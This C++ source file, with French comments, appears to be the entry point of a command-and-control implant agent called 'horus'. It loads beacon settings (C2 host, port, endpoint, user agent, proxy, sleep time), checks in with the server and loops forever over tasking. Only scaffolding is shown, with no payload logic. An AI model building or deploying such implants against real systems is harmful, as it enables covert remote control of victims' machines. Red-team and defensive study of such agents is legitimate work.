// horus.cpp : Ce fichier contient la fonction 'main'. L'exécution du programme commence et se termine à cet endroit.
//

#include "horus.h"
#include "Config.h"

CONFIG_HORUS *horusConfig = nullptr;

VOID horusMain()
{
    horusConfig = (CONFIG_HORUS *)LocalAlloc(LPTR, sizeof(CONFIG_HORUS));
    // Config Init
    horusConfig->agentID = (PCHAR)initUUID;
    horusConfig->hostName = (PWCHAR)hostname;
    horusConfig->httpPort = port;
    horusConfig->endPoint = (PWCHAR)endpoint;
    horusConfig->userAgent = (PWCHAR)useragent;
    horusConfig->httpMethod = (PWCHAR)httpmethod;
    horusConfig->isSSL = ssl;
    horusConfig->isProxyEnabled = proxyenabled;
    horusConfig->proxyURL = (PWCHAR)proxyurl;
    horusConfig->sleeptime = sleep_time;

    PParser ResponseParser = checkin();
    parseCheckin(ResponseParser);
    while (TRUE)
        routine();
}

VOID setUUID(PCHAR newUUID)
{
    horusConfig->agentID = newUUID;
    return;
}